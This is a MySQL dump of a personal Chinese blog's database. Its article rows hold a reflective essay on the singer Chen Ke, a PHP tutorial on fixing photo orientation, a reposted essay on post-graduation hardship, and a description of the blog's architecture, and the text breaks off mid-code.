-- MySQL dump 10.13  Distrib 5.5.40, for Win32 (x86)
--
-- Host: localhost    Database: newalice
-- ------------------------------------------------------
-- Server version	5.5.40

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `article_tag`
--

DROP TABLE IF EXISTS `article_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `article_tag` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `article_id` int(11) NOT NULL,
  `tag_id` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=28 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `article_tag`
--

LOCK TABLES `article_tag` WRITE;
/*!40000 ALTER TABLE `article_tag` DISABLE KEYS */;
INSERT INTO `article_tag` VALUES (1,20,142),(2,100,136),(3,103,139),(4,103,140),(5,103,141),(6,109,135),(7,105,137),(8,107,138),(9,108,119),(10,117,149),(11,127,155),(12,118,150),(13,124,152),(14,119,150),(15,123,150),(16,126,154),(17,128,156),(18,129,157),(22,136,161),(27,137,161),(26,136,141);
/*!40000 ALTER TABLE `article_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `info_article`
--

DROP TABLE IF EXISTS `info_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `info_article` (
  `id` int(11) NOT NULL AUTO_INCREMENT COMMENT '文章ID',
  `top` tinyint(1) NOT NULL DEFAULT '0' COMMENT '置顶',
  `mid` varchar(64) NOT NULL COMMENT '所属分类ID',
  `author` varchar(50) NOT NULL COMMENT '作者',
  `title` varchar(100) NOT NULL COMMENT '文章标题',
  `description` varchar(500) NOT NULL COMMENT '文章描述摘要',
  `seo_title` varchar(100) NOT NULL COMMENT 'SEO - title',
  `seo_description` varchar(500) NOT NULL COMMENT 'SEO - description',
  `seo_keywords` varchar(200) NOT NULL COMMENT 'SEO - 关键词',
  `tag` varchar(100) NOT NULL COMMENT '标签',
  `clicks` int(11) NOT NULL DEFAULT '0' COMMENT '点击次数',
  `content` text NOT NULL COMMENT '文章内容',
  `ctime` int(11) NOT NULL COMMENT '创建时间',
  `updated_at` datetime NOT NULL,
  `created_at` datetime NOT NULL,
  `good_num` int(11) NOT NULL COMMENT '被赞的次数',
  `bad_num` int(11) NOT NULL COMMENT '被拍砖的次数',
  `recommend_type` tinyint(1) NOT NULL COMMENT '推荐类型，1是全站推荐，2是首页推荐',
  `uid` int(11) NOT NULL,
  `image` varchar(128) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `tag` (`tag`),
  KEY `mid` (`mid`)
) ENGINE=MyISAM AUTO_INCREMENT=138 DEFAULT CHARSET=utf8 COMMENT='文章表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `info_article`
--

LOCK TABLES `info_article` WRITE;
/*!40000 ALTER TABLE `info_article` DISABLE KEYS */;
INSERT INTO `info_article` VALUES (20,0,'left','Leunico','再见沉珂，再见，青春。','微博上出现了一条长文，“我是沉珂，大家好，7年不见。在这条长文里，她说之前的颓废是真的，自杀也是真的，只是在鬼门关转了一圈被救回来了。','再见沉珂，再见青春','昨晚，微博上出现了一条长文，“我是沉珂，大家好，7年不见。','沉珂，青春','青春',274,'<p><img style=\"border-radius:4px;\" src=\"http://7xq09h.com1.z0.glb.clouddn.com/20151224_1450959044_589135.jpg\" title=\"20151224_1450959044_589135.jpg\" alt=\"201505291116167679.jpg\"/></p><p>昨晚，微博上出现了一条长文，“我是沉珂，大家好，7年不见。”是的，沉珂还活着。﻿</p><p>在这条长文里，她说之前的颓废是真的，自杀也是真的，只是在鬼门关转了一圈被救回来之后她选择用死亡的声明来结束之前的一切。﻿</p><p>一个口口声声说着死了的人，现在又发声明说其实当初没有死，这种事态就像是一个被推进太平间七八年现在又坐起来突然诈尸的爆炸程度差不多。﻿</p><p>她可以算是最早的一批网络红人了吧，非主流、叛逆、颓废等等，那么多看起来负能量的标签，却让她拥有了以千万计的粉丝，并且更多的人实际上是因为她的死亡，才知道她。﻿</p><p>我是喜欢沉珂的，我觉得似乎只有生活在那个年代的人才能够理解为什么有那么多人要去喜欢去追捧一个伤害自己，以颓废模样示人的女孩。﻿</p><p>从08年到现在，手机换了好几个，但是我每个手机里都还有她唱的歌，其实平心而论，她唱歌算不上好，最多只能算得上努力，但是努力的人有那么多，凭什么她就能在人们心中那么长时间地占据一席之地。﻿</p><p>对于我而言，答案只有一个：共鸣。﻿</p><p>很多八十年代末九十年代初出生的人都有过那样的青春吧，二十一世纪初，那么多的变化和动荡，那么多的繁荣，我们的父辈们都没有见过那么多的欲望和膨胀。于是父母离异，人情冷漠。还在青春期的我们，一面是对这个世界无尽的好奇和欲望，也是在那个时候，第一次见识了很多人性中的丑恶嘴脸，出现在自己的亲人身上。﻿</p><p>在即将对这个世界进行探险的起点，就面对着曾支撑自己的家庭分崩离析，看着曾经和蔼可亲的亲人因利益不惜反目成仇，彼时的少年，在尚未开始对自己的人生进行探险，就感到不安与彷徨。请相信，那种无力与恐惧，足以摧毁一个尚在青春期里的孩子，积极向上的勇气。﻿</p><p>正是张扬活泼的年纪，却突然失去了前行的勇气，我们用各种方式，向这个世界表达我们的不安，表达我们的彷徨，试图制造出更多的声响，去换取更多的关注目光。那时的我们没有充足的物质基础，也没有能做出一番事业的能力，我们所能伤害的，也无非就是那时还鲜活又年轻的肉体，因此，难免会用力过猛，剑走偏锋。﻿</p><p>从她的那些悲伤、那些愤怒、最后到无力的颓废，其实我能听得出，她是有在努力地朝着这个以痛吻我的世界报之以歌的。在那些无数个被泪水浸透的夜晚，我一遍遍地听着这个节奏感不好又时而跑调的女孩诉说着这个世界的伤痛，一遍遍地用她的歌词“我想我们只是两个孩子，在未经历长大的时候被强迫，转眼变的苍白”告诉自己，我们并没有错，只是命运的变化总是那么猝不及防，让我那样措手不及，熬过去吧，天终会亮，一切终会过去。﻿</p><p>你对一个处在伸手不见五指的黑暗中的人说，世界充满温暖和光亮，对他来说，那只是不痛不痒的一句安慰；可是如果你愿意，置身于黑暗当中，坐下来陪我一起等天亮，我想，那才是最有力的安慰和陪伴。﻿</p><p>沉珂的意义就是这样，当我们处在痛苦与彷徨的黑暗当中，她用一种激烈的方式告诉我们，世界就是黑暗的，它就是会一次又一次的伤害你、欺骗你、用尽你所有的力气，依然找不到前进的方向。但她告诉我们，别害怕，不止有你一个人这样，我们大家都在痛，为我们那些不知去向何处表达的负面情绪，提供了一个宣泄的出口。﻿</p><p>她就这样，从很多人那些兵荒马乱的青春里打马而过，她就像是一个符号，真真切切地参与了我们那个充斥着“黄钻QQ空间、火星文、离子烫”的中二少年时代。﻿</p><p>看到她说“有人说她成了邪教代言人，迷途少女的精神领袖”，我笑了，她曾经确实是那个年代，很多人青春的精神领袖，但当年那个也用锋利的刀片伤害过自己的我，时至今日，伤疤一点点淡去，学会化得体的淡妆，对身边的人微笑，衣着得体出入写字楼，在自己的事业中打拼奋斗。在写不出方案的时候点一支烟，工作压力爆格的时候喝一点酒，洗个澡睡一觉生活照旧。我们终究被时光打磨成了，我们曾经期许过的好姑娘。说起来，谁还没有个苦痛彷徨又中二的青春呢？﻿</p><p>就像沉珂在微博上所说的那样，她如今一切都好，忙碌充实，美满安康。我很庆幸当年那么忧伤的女孩儿如今幸福的为人妻、为人母；我也庆幸当初有她陪伴的青春；我更庆幸，度过了那段黑暗无光的日月，我们都成长了，自己喜欢的模样。学会张开双手去拥抱生命，学会为自己的行为承担责任，学会和这个残酷的世界和解，学会一点一滴让自己变得更加优秀。﻿</p><p>那时的少年，就让她永远定格在时光里吧，沉珂再见，陈珂你好。你的归来，是我在2015收获的最美好的礼物，岁月安稳，现世静好，我们都在一点一点，创造属于自己的幸福。﻿</p><p><br/></p>',1446714312,'2016-11-15 16:46:02','0000-00-00 00:00:00',10,0,1,24,'http://7xq09h.com1.z0.glb.clouddn.com/20151224_1450959044_589135.jpg?imageView2/1/w/210/h/140'),(100,0,'php','一只特立独行的猪2号','利用PHP纠正手机照片的方向','通过imagerotate来调整图片方向，但是这个只对还有\'Orientation\'属性或者\'Orientation\'没有被调整过的图片生效，所以如果你的图片是QQ或者微信等其它第三方软件上传的它是无法调整的！因为这个时候要么这个数据已经丢失了，要么就是这个属性已经固定为1了。','PHP纠正手机照片的方向','用函数exif_read_data()取出‘Orientation’来跳整图片方向','PHP，照片方向','照片',423,'<p><img style=\"border-radius:4px\" src=\"http://leunico-upload.stor.sinaapp.com/image/20151218_1450420837_862314.jpg\" title=\"20151218_1450420837_862314.jpg\" alt=\"resource5.jpg\"/></p><p>这是我收到的一个客户问题，也算是比较偏门的问题了吧，起因是客户将图片上传到网站上去发现有的图片方向不对，当然，这是拍照时手机的方向不同导致的，所以就会有一些倒立或者90度倾斜的照片。客户的要求就是用代码自动矫正方向不对的图片然后再上传。于是我找到了这个函数exif_read_data(),它可以将图片信息以数组形式呈现出来，而数组里面的&#39;Orientation&#39;就是代表图片方向，它有三种情况；等于1的时候是正常的；等于6和8都是90度倾斜的，只是方向不同，等于3则是倒立。</p><p>这样就可以通过imagerotate($image,90/180/-90,0)来调整图片方向，但是这里我要说明一点，这个只对还有&#39;Orientation&#39;属性或者&#39;Orientation&#39;没有被调整过的图片生效。所以如果你的图片是QQ或者微信等其它第三方软件上传的它是无法调整的！因为这个时候要么这个数据已经丢失了，要么就是这个属性已经固定为1了。所以我说有些偏门...下面是我用的代码</p><pre><code class=\"language-css\">@chmod($uploadfile,&nbsp;0755);\r\n$exif&nbsp;=&nbsp;exif_read_data($uploadfile);\r\n	if&nbsp;(!empty($val[&#39;Orientation&#39;])){\r\n		$image&nbsp;=&nbsp;imagecreatefromjpeg($uploadfile);\r\n		switch($val[&#39;Orientation&#39;])&nbsp;{\r\n			case&nbsp;3:\r\n			&nbsp;&nbsp;&nbsp;&nbsp;$image&nbsp;=&nbsp;imagerotate($image,&nbsp;180,&nbsp;0);\r\n			&nbsp;&nbsp;&nbsp;&nbsp;break;			\r\n			case&nbsp;6:\r\n			&nbsp;&nbsp;&nbsp;&nbsp;$image&nbsp;=&nbsp;imagerotate($image,&nbsp;-90,&nbsp;0);\r\n			&nbsp;&nbsp;&nbsp;&nbsp;break;			\r\n			case&nbsp;8:\r\n			&nbsp;&nbsp;&nbsp;&nbsp;$image&nbsp;=&nbsp;imagerotate($image,&nbsp;90,&nbsp;0);\r\n			&nbsp;&nbsp;&nbsp;&nbsp;break;\r\n		}\r\n		imagejpeg($image,$uploadfile,90);\r\n	}</code></pre><p>包装成方法</p><pre><code class=\"language-css\">function&nbsp;image_fix_orientation($filename)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;$exif&nbsp;=&nbsp;exif_read_data($filename);\r\n&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!empty($exif[&#39;Orientation&#39;]))&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$image&nbsp;=&nbsp;imagecreatefromjpeg($filename);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;($exif[&#39;Orientation&#39;])&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;3:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$image&nbsp;=&nbsp;imagerotate($image,&nbsp;180,&nbsp;0);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;6:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$image&nbsp;=&nbsp;imagerotate($image,&nbsp;-90,&nbsp;0);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;8:\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$image&nbsp;=&nbsp;imagerotate($image,&nbsp;90,&nbsp;0);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;imagejpeg($image,&nbsp;$filename,&nbsp;90);\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n}</code></pre><p>经测试的却可以，但是如上面说的，这对上传条件是有要求的。<br/></p><p>本文原创。</p>',1449560521,'2016-10-14 08:46:02','0000-00-00 00:00:00',7,0,1,6,'http://7xq09h.com1.z0.glb.clouddn.com/20151218_1450420837_862314.jpg?imageView2/1/w/210/h/140'),(103,0,'book','一只特立独行的猪2号','【转】乌云总会消散于艳阳当中','1几年之前，开始毕业实习，清理学校宿舍里的东西，该丢的丢，该留的留，最后收拾了好几个大箱子的物件，而且多是这些年用来学习买来的书籍当时我实习的单位在另外一个城市，我带着这大包小行从学校门口搭乘很长时间的公交车，来到火车站...','乌云总会消散于艳阳当中','1几年之前，开始毕业实习，清理学校宿舍里的东西，该丢的丢，该留的留，最后收拾了好几个大箱子的物件...','乌云，毕业','生活，毕业，短文',506,'<p><img style=\"width:575px; height:416px;border-radius:4px\" src=\"http://7xq09h.com1.z0.glb.clouddn.com/20151224_1450921709_952293.jpg\" title=\"20151224_1450921709_952293.jpg\" alt=\"24549-98315e681d902a5f.jpg\" width=\"575\" height=\"416\"/></p><p style=\"text-align: center;\"><strong><span style=\"color: rgb(79, 97, 40);\">One</span></strong></p><p>几年之前，开始毕业实习，清理学校宿舍里的东西，该丢的丢，该留的留，最后收拾了好几个大箱子的物件，而且多是这些年用来学习买来的书籍当时我实习的单位在另外一个城市，我带着这大包小行从学校门口搭乘很长时间的公交车，来到火车站，然后买票进站安检等待上车一个人拖着沉重的行李，就像是在攀爬珠峰一样，在这拥挤的人群中间半天都不得动弹，此时的我恨不得能长出三头六臂来。</p><p>火车跌跌撞撞一路摇荡，就像一个不知归途的醉酒老汉车厢里拥挤不堪，逼仄窒闷，坐着的站着的，每一个角落都没有空隙，就像是一罐沙丁鱼罐头我头晕目眩，想要呕吐，却又吐不出来，想睡也睡不着，如同被困在笼子里的野兽，逃脱不得，只能把所有的负面情绪强吞下去，憋在胸口路途漫长，火车一路经过房屋密集的小镇污浊浑黄的河流大片绿油油发亮的田陌破落的村庄连绵不断的丘陵我没有心情看着窗外的风景，只希望可以早点结束让我几近崩溃的征程。</p><p>火车傍晚到达黑压压的一大群人挤着疲惫不堪就好像要虚脱一样的我走出拥挤的车站走出来的那一瞬间，我意识到我兵荒马乱的生活才刚刚开始。</p><p><br/></p><p style=\"text-align: center;\"><strong><span style=\"color: rgb(79, 97, 40);\">Two</span></strong></p><p style=\"margin-top: 0px; margin-bottom: 25px; text-align: justify; word-break: break-word; color: rgb(47, 47, 47); font-family: &#39;lucida grande&#39;, &#39;lucida sans unicode&#39;, lucida, helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft YaHei&#39;, &#39;WenQuanYi Micro Hei&#39;, sans-serif; line-height: 27.2px; white-space: normal; background-color: rgb(255, 255, 255);\"><span style=\"line-height: 27.2px;\"></span></p><p>新租的寓所在一条破巷弄里，一楼房间也许是许久没有人住过了，灰尘弥漫，又潮又湿，我不得不一遍又一遍擦拭床铺，花数小时把地板和洗手间清理干净那间房子仅仅能放了一张床，墙壁破损不堪，没有书柜和衣柜，没有卫生间每次上厕所，我都要跑到巷子对面的公共厕所去。</p><p>那时候最怕的就是交房租，一个月工资两千多点，交了房租，银行卡里就所剩无几，又不敢让父母知道自己的情况，只好把伙食费用降到最低，有的时候一天甚至只吃一顿饭。</p><p>我擦了擦挂在墙上也许好久了的镜子，给自己一个微笑我不富有，我有勇气对自己诚实的微笑，这微笑就像躺在天边的云彩，洁白的无可复制。</p><p>我用了一个月的工资给自己买了第一个智能手机，小米。在人人手里都拿着iphone的时候，我自欺欺人地认为小米也许比iphone更好用。</p><p>贫困还好，更要命的是工作看着一同进公司的同学开始慢慢崭露头角，签单，拉客户，做策划，做设计，而我却一无是处每天我都低着头进公司，然后再低着头出公司，我害怕遇见熟人，害怕和人打招呼突然之间所有的意气风发都消失的无影无踪，留下的永远都是失败失败再失败。</p><p>每天晚上，我把自己窝在床上，什么都不想，什么都不做，好像日子就会这样一天天过去，没有烦恼，没有痛苦，没有老板训斥，没有业务压力我把自己装在套子里，拼命逃避这世界可是逃不掉的，每天早晨闹钟响起时，我还是要心不甘情不愿的起床，然后有气无力地去上班。</p><p>生活就这样了？我梦寐以求的生活变得这么不堪，而我却无动于衷，这是多么可笑的事情，不，这是多么可怕的事情我望着镜子里的那个我，我发现我不见了，镜子里那个张牙舞爪的人不再是我，而是一个被这世界磨灭了灵魂的人。</p><p>我开始有意识地改变我把闹钟往前调了半小时，闹钟响起，立马起床，我要去跑步来公司这么久，这周围我甚至都还不清楚，从那以后，我围着公司所在那个马路跑步，我想去认识这世界，至少是认识这周围。</p><p>别人的能力我可能没有也许他有三寸不烂之舌，能为公司攻城拔寨，也许他有奇思妙想，能为公司出谋划策，也许他甚至是个官二代富二代，能为公司遮风挡雨，这些我都没有可那又怎样？每天晚上下班，我依旧把自己锁在那狭小的空间内，只是我不再望着那随时都可能掉下来的楼板，我大声念着英语课文，背着单词，我把下班之后所有精力全部放在英语上我想总有一天，我能用到的，总有一天，我会走出家门，我要到这世界去看看。</p><p><br/></p><p style=\"text-align: center;\"><strong><span style=\"color: rgb(79, 97, 40);\">Three</span></strong></p><p>大三那一年的冬季，心灰意懒，也不知什么缘故，突然觉得活得好累，好疲惫。</p><p>从很小的时候开始，就一直在为了考试为了分数忙碌着，丝毫不敢懈怠到了大学，混个三两年之后，又不得不开始为工作发愁我打心底嫉妒那些不用特别努力就能取得好成绩的同学和那些混了四年之后照样可以找打一份好工作的校友，可嫉妒有什么用呢？它并不能改变我的生活，并不能提高我的智商，同样也不能赐给我一份吃喝不愁的工作。<br/></p><p>累了，实在是累了，他妈的最多就是回老家种田去，他妈的买不起房子大不了不买，他妈的娶不起媳妇大不了不娶，管他妈的人生，管他妈的生活。</p><p>我索性在学校附近的校工楼旁边花了200元租了一间简陋房间，隔壁有一对学生情侣入住，每晚能听到他们的莫名其妙的欢愉声响那两个月我近乎不去教室上课，自顾地疯狂的躲在自己的房间里面每晚看电影，看电视，像是要把所有的娱乐时间补下来。</p><p>偶尔去楼下附近的钢琴室学习钢琴钢琴老师每个星期教一个小时的课程，天哪，我需要学到猴年马月去了吧于是自己在网上选购了基本书籍，在网路上翻看视频，自己学习起来，把基本理论知识搞通之后，每天抽时间练习练习指法，一个星期后我就会来一首简单的曲子了，那首歌叫做&quot;You are my sunshine&quot;。</p><p>有时天气特冷，外面阴森森的，从超市里买大堆的零食方便面面包，躲在被子里面睡到昏天暗地，从晚睡到早，从早睡到晚醒了吃点东西继续蒙头大睡。</p><p>两个多月的时间，这也算是我生命的一部分，因为我知道我一生再也难有这样的两个月了，可以这样放纵这样堕落这样无所事事这样不管理想追求生活。</p><p><br/></p><p style=\"text-align: center;\"><strong><span style=\"color: rgb(79, 97, 40);\">Four</span></strong></p><p>其实每个人都会有最艰难的时刻。</p><p>李安当年违背父亲的意愿，坚决兀自报考了美国伊利诺大学的戏剧电影系，从1983年起，大部分时间他只能帮剧组看看器材做点剪辑助理，依靠了一点一滴的积累在美国电影界打拼有一次，他拿着自己写的剧本，两个星期跑了三十多家公司，换来的却是一次次白眼和拒绝那是他已经将近三十岁了，古人说：三十而立，而他连自己的生活都还没法自立，这其中的辛酸只有他一个人能够体会得到。</p><p>然而在美国电影界，一个没有任何背景的华人要想混出名堂来，谈何容易？</p><p>没有事情做的时候，他只能靠着妻子微薄的收入，当起“家庭妇男”曾经有一段时间，因为生活压力太大，他一度想要放弃电影，委曲求全改学计算机李安的妻子察觉到他的消沉，一夜沉默后，第二天，上班前给他留一句话：“安，要记得你心里的梦想！”</p><p>学计算机的李安有无数个，可是当导演的李安只有他一个。<br/></p><p>后来的事情大家都知道了，由于他坚持不懈的努力，命运最终垂青于他他的理智与情感。卧虎藏龙断背山以及少年派的奇幻漂流让他数次登上好莱坞的舞台，成为当代国际影坛声名最盛的华人导演。<br/></p><p>我向来不太喜欢用某个人成功的案例来去定义所有人的经历和故事一个人能够成功，其中涵盖太多的因素，但是成功的人努力都是一样的，只有在我们最艰难的时候，不忘初心，始终报命运以微笑，我们才能对得起风雨过后的彩虹。<br/></p><p>我始终记得陈坤说过的一段话：我长得不是最帅的，演技也不是最好的，智商也不是最高的，却得到这么多的财富，难道我付出的多吗？不多小的时候要努力到极限才能得到一点点回报的陈坤，突然你没怎么努力就得到那么多的名誉和财富，心里有的是恐慌。<br/></p><p>那些成功了的人风光的背后是我们无法想象得到的风雨兼程啊，没有付出太多努力就得到了丰厚的回报，我们是会恐慌的吧，因为这样的回报绝大多数都是昙花一现，并不能让我们真正独立起来。<br/></p><p><br/></p><p style=\"text-align: center;\"><span style=\"color: rgb(79, 97, 40);\"><strong>Five</strong></span></p><p>电影这个杀手不太冷当中，小女孩玛蒂尔达问，是人生总是如此艰难还是只有童年才是？莱昂回答，总是如此！</p><p>人生这条路，许多人终究像是完成社会所定的规则和路线上学的年纪读破了几百本书却依然没法读上一个好大学工作的年纪打几份工作都没法买一个像样的房子那些我们曾经引以为傲的成绩在现在看来什么都不是，那些盲目自信乐观的倔强一次又一次阻碍我们的阳光而这所有的一切不过都是命运和我们开的玩笑，如果你懂得，你就会发现这远不是最艰难的时刻。</p><p>我们都有很多无能为力的事情，我们想要更大的房子，可是收入却连租房都很吃力，我们曾经非常喜欢一个人，付出很多，但是对方却直接无视我们，也只能独自憋下所有的委屈与苦闷很多时候你可能知道你追逐的东西根本得不到，但即便这样，我们也不能放下追逐的脚步遗憾可能会伴随终生，却是开在生命中最美丽的花朵。</p><p>我也一直坚信这世界没有什么跨不过去的坎，所有的坎不过就是横在我们面前的纸老虎，我相信任何苦难都能够解决，我相信任何问题都有答案。</p><p>一切都会过去的，不用急，乌云总归会消散于艳阳当中。</p><p><br/></p><p>原文链接:<a href=\"http://www.jianshu.com/p/8e6ee7367ca2\" target=\"_blank\" title=\"乌云总会消散于艳阳当中\">乌云总会消散于艳阳当中</a></p>',1445565948,'2016-11-16 08:37:58','0000-00-00 00:00:00',3,0,1,6,'http://7xq09h.com1.z0.glb.clouddn.com/20151224_1450921709_952293.jpg?imageView2/1/w/210/h/140'),(109,0,'php','一只特立独行的猪2号','本网站的建设过程和网站架构的基本介绍','我自己写的一个个人博客网站。网站优化有Memcache缓存优化、文章页面伪静态化、以及SAE自带优化功能，其他方面还有文章SEO、评论发送邮件和百度主动推送等功能。另外还支持微信扫一扫注册和登录（微信测试帐号喔~）。Ps.没用框架。','微架构博客网站','没用框架在SAE上搭建的一个博客网站~','架构，博客网站','建站',1341,'<p><img style=\"border-radius:4px;\" src=\"http://leunico-upload.stor.sinaapp.com/image/20151218_1450403080_453748.jpg\" title=\"20151218_1450403080_453748.jpg\" alt=\"working.jpg\"/></p><p>这个是我自己写的一个个人博客网站。一开始想用Lumen框架来写的，后来发现在SAE上不好部署，而且还觉得好像用不着=。=...因为本来这样一个个人网站数据结构也不会太复杂，也没有高并发之类的问题，所以就自己弄了个小框架。。。嗯，有什么意见一定要提啊，我工作还不久，是个小菜鸟，虚心求大牛的意见，谢谢哦！<br/></p><p>回归正题，网站优化有Memcache缓存优化、文章页面伪静态化、以及SAE自带优化功能，其他方面还有文章SEO、评论发送邮件、百度UEditor编辑器和百度主动推送等功能。另外还支持微信扫一扫注册和登录（微信测试帐号喔~），具体实现方法请<a href=\"http://520.leunico.sinaapp.com/articleshow/108\" target=\"_blank\" title=\"用微信测试帐号实现微信扫一扫登录和注册的方法\">戳这里</a>。还有，对于我这个完美主义者来说，前端真是个大坑啊...</p><p>Ps.这是1.0版本，代码已经修改了很多，请点击查看这篇文章吧<a href=\"http://www.lzxya.com/articleshow/117\" target=\"_self\" title=\"服务器搬家到阿里云外加部分代码重写了下~\">服务器搬家到阿里云外加部分代码重写了下~</a></p><h2>程序代码结构（网站架构）</h2><p><img src=\"http://leunico-upload.stor.sinaapp.com/image/20151215_1450187258_729516.png\" title=\"20151215_1450187258_729516.png\" alt=\"QQ截图20151215212735.png\"/></p><p><br/></p><h2>app文件夹（应用代码区）</h2><p><span style=\"background-color: rgb(255, 255, 255);\">由四个文件夹组成，基于MVC的设计模式</span><span style=\"background-color: rgb(255, 255, 255);\">。</span><br/></p><p><img src=\"http://leunico-upload.stor.sinaapp.com/image/20151216_1450271457_100422.png\" title=\"20151216_1450271457_100422.png\" alt=\"QQ截图20151216203637.png\"/></p><p><br/></p><h2>AliceFrameWork文件夹（框架核心区）</h2><p>框架使用了命名空间，所以在应用代码区可以用use的方式引入部分框架文件(类似于laravel5)。<br/></p><p><img src=\"http://leunico-upload.stor.sinaapp.com/image/20151216_1450271629_242121.png\" title=\"20151216_1450271629_242121.png\" alt=\"QQ截图20151216203259.png\"/></p><p><br/></p><h2>网站获取页面完成的一次流程</h2><p>网站初始化后，根据路由文件的解析会有对应的控制器文件。下面是获取首页的控制器代码。<br/></p><p><span style=\"color: rgb(0, 176, 80);\"><span style=\"font-size: 20px;\"><span style=\"font-size: 16px; color: rgb(0, 0, 0);\">Ps.咳咳，千万不要吐槽命名...</span></span></span></p><pre><code class=\"language-css\">public&nbsp;function&nbsp;index(){		\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$fields&nbsp;=&nbsp;Request::getRequest(&#39;page&#39;,&nbsp;&#39;int&#39;);//取得页数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$page&nbsp;=&nbsp;isset($fields)&nbsp;&amp;&amp;&nbsp;$fields&nbsp;&gt;&nbsp;0&nbsp;?&nbsp;$fields&nbsp;:&nbsp;1;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//缓存\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$time&nbsp;=&nbsp;3600&nbsp;*&nbsp;5;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mem&nbsp;=&nbsp;memcache_init();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;memcache_get($mem,&#39;row_cache_indexController_&#39;.$page);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(empty(getConfig(&#39;MEMCACHE&#39;))&nbsp;||&nbsp;!$ret){	